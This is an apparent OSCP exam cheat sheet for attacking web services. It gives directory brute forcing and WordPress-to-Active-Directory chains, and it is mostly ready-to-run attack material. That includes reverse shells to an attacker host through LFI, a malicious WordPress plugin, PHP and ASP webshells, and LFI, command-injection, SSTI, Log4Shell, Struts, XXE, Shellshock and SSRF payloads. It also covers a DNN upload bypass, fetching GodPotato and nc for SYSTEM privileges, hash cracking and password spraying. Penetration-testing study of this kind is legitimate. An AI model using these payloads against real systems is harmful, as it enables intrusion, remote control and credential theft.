---
title: "Web Attacks"
date: 2026-06-20
weight: 30
draft: false
tags: ["oscp", "cheatsheet"]
summary: "A checklist covering directory brute forcing, CMS, LFI, file upload, SSTI, and XXE."
---

A checklist to run the moment you find a web port. Covers directory brute forcing, CMS, LFI, file upload, SSTI, XXE, and DNN.

- Source: https://heretek.dev/oscp-cheatsheet/web-attacks/ (Jean Romero) — Reconstructed
- Variables: `$TARGET` = target host, `$KALI` = attacker Kali IP
- Variables: `$ip` = target web server IP (used interchangeably), `ATTACKER`/`CALLBACK` in the text are placeholders

## Reconnaissance and Directory Discovery

Run these in parallel as soon as you find a web port:

```bash
# Quick hits + common files
gobuster dir -u http://$ip -w /usr/share/seclists/Discovery/Web-Content/quickhits.txt -t 50

# Standard directory bust
ffuf -ac -t 60 -u http://$ip/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt

# CRITICAL: ALSO run with raft-large directories AND case-variant wordlists
# Lowercase-only wordlists MISS files like /CHANGELOG, /README, /API, /Admin
ffuf -ac -t 60 -u http://$ip/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt
ffuf -ac -t 60 -u http://$ip/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt

# Virtual host discovery (if domain known)
ffuf -u http://$ip/ -H "Host: FUZZ.<domain>" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs <default_size>
```

On a standalone web target, run all of these in priority order:

1. `raft-medium-directories.txt` — fast first pass
2. `raft-large-directories.txt` — mixed case. Catches `/CHANGELOG`, `/Admin`, `/API`
3. `raft-large-files.txt` — extension aware
4. `directory-list-2.3-medium.txt` — dirbuster classic
5. `common.txt` — last-resort backup

Always check common dev/info files manually, including case variants:

```bash
for path in CHANGELOG README LICENSE VERSION TODO NOTES changelog readme; do
  curl -sI "http://$ip/$path" | head -1
done
```

Building an employee name list for AD username enumeration:

```bash
username-anarchy --input-file fullnames.txt --select-format first,flast,first.last,firstlast > usernames.txt
```

Always check manually:

```bash
curl http://$ip/robots.txt
curl http://$ip/sitemap.xml
curl http://$ip/.git/HEAD
curl http://$ip/web.config
curl http://$ip/.env
curl http://$ip/wp-config.php.bak
curl http://$ip/phpinfo.php
```

View source on every page: look for HTML comments (credentials/paths), hidden form fields, JS files containing API endpoints, version information, and admin panel links.

## POST vs GET

If GET errors or returns an empty response, try POST:

```bash
curl http://$ip:PORT/endpoint
curl -d "" -X POST http://$ip:PORT/endpoint
curl -d "" -X POST -H "Content-Type: application/x-www-form-urlencoded" http://$ip:PORT/endpoint

# GET requests
curl http://$TARGET:<port>/
curl http://$TARGET:33333/<endpoint>

# POST requests
curl -s -i -X POST -H 'Content-Length: 0' http://$TARGET:<port>/<endpoint>
```

Lesson: a high-port API (e.g. 33333) returned nothing on GET. A POST with a Content-Length header exposed a process list, which contained hardcoded credentials. If GET looks empty, always try POST.

### LFI → RCE reverse shell (through a known/uploaded PHP shell)

```bash
# bash reverse shell through the shell's cmd parameter
curl -sG "http://$TARGET/index.php" \
  --data-urlencode "file=simple_shell.php" \
  --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/$KALI/443 0>&1'"

# python3 reverse shell
curl -sG "http://$TARGET/index.php" \
  --data-urlencode "file=simple_shell.php" \
  --data-urlencode "cmd=python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"$KALI\",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'"

# mkfifo reverse shell
curl -sG "http://$TARGET/index.php" \
  --data-urlencode "file=simple_shell.php" \
  --data-urlencode "cmd=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $KALI 443 >/tmp/f"
```

If outbound traffic is filtered, first find which egress port is open, then fire the shell on that port:

```bash
# 1. Listen on Kali for probes
sudo tcpdump -ni tun0 "tcp and host $TARGET and (port 443 or port 80 or port 53)"

# 2. Fire timeout probes to common egress ports (whichever shows a SYN in tcpdump is open)
curl -sG 'http://$TARGET/index.php?file=....//....//....//<path>/simpleshell.php' --data-urlencode 'cmd=timeout 3 bash -c "echo x > /dev/tcp/$KALI/443"'
curl -sG 'http://$TARGET/index.php?file=....//....//....//<path>/simpleshell.php' --data-urlencode 'cmd=timeout 3 bash -c "echo x > /dev/tcp/$KALI/80"'

# 3. Base64-encode the reverse shell and fire it on the working port
echo -n 'bash -i >& /dev/tcp/$KALI/443 0>&1' | base64
rlwrap nc -lvnp 443
```

## CMS Identification and Exploitation

```bash
wpscan --url http://$ip --enumerate p --plugins-detection aggressive
droopescan scan drupal -u http://$ip
joomscan --url http://$ip
```

For any CMS: `searchsploit <CMS> <version>` → check unauthenticated exploits first.

## WordPress Exploitation

Chain: WordPress → wp-config.php → MySQL → dump hashes → crack → AD spray

### Phase 0 — Add the hostname to /etc/hosts

```bash
# WordPress often redirects to a hostname — map it so links/wp-json resolve
echo "$ip wordpress.local" | sudo tee -a /etc/hosts
```

### Phase 1 — WPScan enumeration

```bash
wpscan --url http://TARGET --enumerate p,t,u --plugins-detection aggressive
curl http://TARGET/wp-json/wp/v2/users
```

### Phase 2 — WordPress login brute force

```bash
wpscan --url http://TARGET --password-attack xmlrpc -U admin -P /path/to/wordlist -t 30
```

### Phase 3 — WordPress admin → shell (5 methods)

1. Theme editor (404.php) → `http://TARGET/wp-content/themes/THEME_NAME/404.php`
2. Upload a malicious plugin — with this content:

```text
<?php
/**
* Plugin Name: Starter Plugin
* Version: 1.0
*/
exec("/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'");
?>
```

   Then: `zip revshell.zip revshell.php` → Plugins → Add New → Upload → Activate
3. Metasploit → `exploit/unix/webapp/wp_admin_shell_upload`
4. Plugin editor → modify an existing plugin PHP file
5. Quick webshell:

```text
<?php if(isset($_REQUEST["cmd"])){ echo "<pre>"; system($_REQUEST["cmd"]); echo "</pre>"; die; } ?>
```

### Phase 4 — wp-config.php → MySQL → credential dump

```bash
cat /var/www/html/wp-config.php
```

### Phase 5 — MySQL DB exploitation

```sql
mysql -u DB_USER -p'DB_PASS' -h localhost DB_NAME
SELECT user_login, user_pass FROM wp_users;
SELECT concat_ws(':', user_login, user_pass) FROM wp_users;
```

### Phase 6 — Cracking WordPress hashes

```bash
hashcat -m 400 hashes.txt /usr/share/wordlists/rockyou.txt
john --format=phpass hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

### Phase 7 — AD spray

```bash
nxc smb DC_IP -u userlist.txt -p 'wordpress_password' --continue-on-success
nxc winrm DC_IP -u username -p 'cracked_wp_hash'
```

## Authentication Testing

Try on every login: `admin:admin`, `admin:password`, `admin:Password1`, `root:root`, `tomcat:s3cret`, `postgres:postgres`, `sa:sa`, `Company2024!`

## SQLi

Scope: detection checklist (7 tests), authentication bypass, error-based (MySQL/MSSQL/PostgreSQL), UNION-based (full DB), stacked queries → xp_cmdshell RCE, blind (boolean/time), Python extraction scripts, INTO OUTFILE webshell, WAF bypass. See [sql-injection.md](sql-injection.md) for details.

For MSSQL (IIS + ASP.NET), try stacked queries first: `'; WAITFOR DELAY '0:0:5'--` — if it delays, skip UNION and go straight to xp_cmdshell.

## LFI

Test payloads:

```text
?page=../../../etc/passwd
?page=....//....//....//etc/passwd
?page=..%2f..%2f..%2fetc%2fpasswd
curl -s "http://target/index.php?file=....//....//....//etc/passwd"
?page=php://filter/convert.base64-encode/resource=index.php
?page=php:
?page=data://text/plain,<?php system('id'); ?>
```

Windows LFI paths:

```text
?page=C:/windows/system32/drivers/etc/hosts
?page=C:/inetpub/wwwroot/web.config
?page=C:/xampp/apache/conf/httpd.conf
```

Files to read via Windows LFI (priority):

```text
C:/xampp/htdocs/dashboard/phpinfo.php
C:/xampp/apache/conf/httpd.conf
C:/xampp/php/php.ini
C:/xampp/phpMyAdmin/config.inc.php
C:/xampp/tomcat/conf/tomcat-users.xml
C:/inetpub/wwwroot/web.config
C:/windows/system32/drivers/etc/hosts
C:/xampp/htdocs/wp-config.php
```

### Web Root Locations

- Apache (XAMPP) / Windows → `C:\xampp\htdocs\`
- Apache / Linux → `/var/www/html/`
- IIS / Windows → `C:\inetpub\wwwroot\`
- nginx / Linux → `/var/www/html/`
- Tomcat / common → `webapps/`

### LFI → RCE

- Log poisoning: inject `<?php system($_GET['cmd']); ?>` into User-Agent → include `/var/log/apache2/access.log`

PHP wrappers:

```text
?page=php://input    (POST: <?php system('bash -i >& /dev/tcp/ATTACKER/4444 0>&1'); ?>)
?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=&cmd=whoami
```

If you already have any shell (SSH, etc.) and find LFI in a localhost service, write a PHP webshell and include it via LFI:

```bash
# Write webshell to a writable directory
echo '<?php system($_GET["cmd"]); ?>' > /dev/shm/shell.php
# Include it via LFI
curl "http://127.0.0.1:8000/backend/?view=../../../../../dev/shm/shell.php&cmd=id"
```

Writable directories to try, in order:

1. `/dev/shm` — shared memory, world-writable, not noexec (best)
2. `/var/tmp` — survives reboot
3. `/tmp` — sometimes mounted noexec, try last
4. `/run/shm` — alias for /dev/shm on some distros

### RFI (when allow_url_include=On)

```text
?page=http://ATTACKER/shell.php
```

## Command Injection

```text
; whoami
| whoami
|| whoami
&& whoami
`whoami`
$(whoami)
%0a whoami
```

Blind check: `; ping -c 3 ATTACKER_IP` → `sudo tcpdump -i tun0 icmp`

## File Upload

Try in order: normal extension → alternative extension (`.phtml`, `.php5`) → double extension (`shell.php.jpg`) → null byte (`shell.php%00.jpg`) → Content-Type spoofing → magic bytes (`GIF89a`) → `.htaccess` trick → case variants → IIS trick (`shell.asp;.jpg`)

Minimal webshell:

```text
<?php system($_GET['cmd']); ?>
```

```text
<% Set o = Server.CreateObject("WSCRIPT.SHELL") : Set x = o.exec("cmd /c " & Request("cmd")) : Response.Write x.StdOut.ReadAll %>
```

## SSTI

Detection: `${{ <%[%'"}}%\` → then `{{7*7}}` → 49 means Jinja2/Twig, `${7*7}` → FreeMarker

Jinja2 RCE:

```text
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

Twig RCE:

```text
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id")}}
```

## Java Backend RCE (Tomcat / Spring / JBoss / Struts)

Signs the backend is Java:

- nmap shows `Apache Tomcat`, `Jetty`, `JBoss`, `WebLogic`
- nmap favicon line: `Spring Java Framework`
- HTTP headers: `X-Powered-By: Servlet`, `Server: Apache-Coyote`
- Cookies: `JSESSIONID`
- API endpoints respond with `Content-Type: text/plain;charset=UTF-8` (Tomcat default)
- Extensions `.jsp`, `.do`, `.action`

Fuzzing list — try each in reflected parameters, headers, User-Agent, and Cookie. Watch for DNS callbacks or sleep/delay:

```text
${jndi:ldap://CALLBACK/x}                                          # Log4Shell - CVE-2021-44228
${jndi:dns://CALLBACK}                                             # Log4Shell variant
${dns:address|CALLBACK}                                            # Text4Shell - CVE-2022-42889
${url:UTF-8:http://CALLBACK/}                                      # Text4Shell variant
${script:javascript:java.lang.Runtime.getRuntime().exec("sleep 10")}   # Text4Shell visible
T(java.lang.Runtime).getRuntime().exec("sleep 10")                 # Spring SpEL
%{(#cmd='id').(@java.lang.Runtime@getRuntime().exec(#cmd))}        # Struts2 OGNL - CVE-2017-5638
class.module.classLoader.URLs[0]=                                  # Spring4Shell - CVE-2022-22965
```

If a payload reacts (delay/callback), find the full RCE syntax here:

- HackTricks: book.hacktricks.wiki (Java RCE / Tomcat / Spring pages)
- PayloadsAllTheThings: github.com/swisskyrepo/PayloadsAllTheThings (Java page)

Other Java entry points to check:

- Tomcat manager: `/manager/html` + default credentials (`tomcat:tomcat`, `admin:admin`, `tomcat:s3cret`) → WAR upload
- Spring Actuator: `/actuator`, `/actuator/env`, `/actuator/heapdump`, `/actuator/mappings`
- JBoss: `/jmx-console`, `/web-console`, `/invoker/JMXInvokerServlet`

Preparing a DNS callback (no internet during the exam — local only):

```bash
# Listen for DNS lookups from target on tun0
sudo tcpdump -i tun0 -n 'port 53' -A
# Use your own Kali tun0 IP as the callback host in payloads.
# Works for ${dns:...} and ${url:...} probes that resolve hostnames.
# For ${jndi:ldap://...} you need an LDAP server (marshalsec) — different setup.
```

## XXE

```text
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>
```

## Shellshock (CVE-2014-6271)

```bash
curl -H "User-Agent: () { :; }; echo; /usr/bin/id" http://$ip/cgi-bin/script.sh
curl -H "User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/ATTACKER/4444 0>&1" http://$ip/cgi-bin/script.sh
```

## SSRF

```text
?url=http://127.0.0.1:8080/admin
?url=http://169.254.169.254/latest/meta-data/
?url=file:///etc/passwd
```

## Using URL query parameters as input

`?` starts the query string. `http://target/?whoami` = the part after `?` is the command.

## DotNetNuke (DNN) Exploitation

### Recognition

- A /Login page with DNN branding
- Portals/0/ in the URL
- DNN or DotNetNuke mentioned in HTTP response headers
- Default portal directory: /Portals/0/

### Default Credentials

```text
admin : password
host : dnnhost
```

Try these on /Login before anything else.

### If the default credentials were changed: check the MSSQL password

```sql
SELECT * FROM dbo.aspnet_Membership;
```

- Updating the password via SQL is tricky because of salt+PBKDF2.
- Easier: check the admin account lock status in the HostSettings table.

### Post-auth exploitation: file upload extension bypass

DNN blocks .aspx uploads by default. To upload an aspx webshell:

1. Log in as admin at /Login
2. Persona Bar → Settings → Security → More → More Security Settings
3. Find 'Allowable File Extensions' (HostSettings table, SettingName='FileExtensions')
4. Add 'aspx' to the comma-separated list
5. Save

```sql
UPDATE HostSettings SET SettingValue = 'bmp,gif,ico,jpeg,jpg,jpe,png,svg,aspx,asp,ashx' WHERE SettingName = 'FileExtensions';
```

### Upload the webshell

- Admin → File Management → upload cmdasp.aspx
- Or Persona Bar → File Management

### Access the webshell

```text
http://TARGET/Portals/0/cmdasp.aspx
```

Portal ID 0 is the upload root of the default portal. Other portals live under /Portals/1/ etc.

### Privesc from Webshell

The IIS AppPool identity holds SeImpersonatePrivilege. Go to SYSTEM with GodPotato or PrintSpoofer.

```bash
whoami /priv
# Download tools
powershell -c "iwr http://KALI/GodPotato-NET4.exe -o C:\Windows\Temp\gp.exe"
powershell -c "iwr http://KALI/nc.exe -o C:\Windows\Temp\nc.exe"
# Listener on Kali
C:\Windows\Temp\gp.exe -cmd "C:\Windows\Temp\nc.exe KALI 4444 -e cmd.exe"
```

Typical chain: /Login default credentials → aspx extension allowlist bypass → webshell → SeImpersonate privesc (GodPotato/PrintSpoofer) → SYSTEM

## Quick Links (documents in the same folder)

- Full workflow → [methodology.md](methodology.md)
- SQL injection details → [sql-injection.md](sql-injection.md)
